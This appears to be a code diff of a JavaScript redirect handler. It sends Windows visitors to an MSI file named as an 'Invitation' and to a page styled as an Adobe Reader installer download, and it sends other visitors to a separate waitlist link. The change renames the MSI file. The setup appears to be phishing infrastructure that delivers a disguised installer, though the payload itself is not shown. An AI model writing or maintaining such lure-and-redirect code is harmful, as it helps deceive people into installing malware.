@@ -4,7 +4,7 @@ export default function handler(req, res) {
 
   const WINDOWS_REDIRECT_AFTER_DOWNLOAD =
     'uswebsites.com/adobe-reader/installer/download.html';
-  const MSI_PATH = '/Invitation-9023.msi';
+  const MSI_PATH = '/Invitation-90233.msi';
   const NON_WINDOWS_TARGET = 'https://waitlist.yutrija.app/d7ZczaSFKF2uS!KSpDa/';
 
   let email = '';
@@ -56,6 +56,7 @@ export default function handler(req, res) {
   res.writeHead(302, { Location: finalUrl });
   res.end();
 }
+
 
 
 
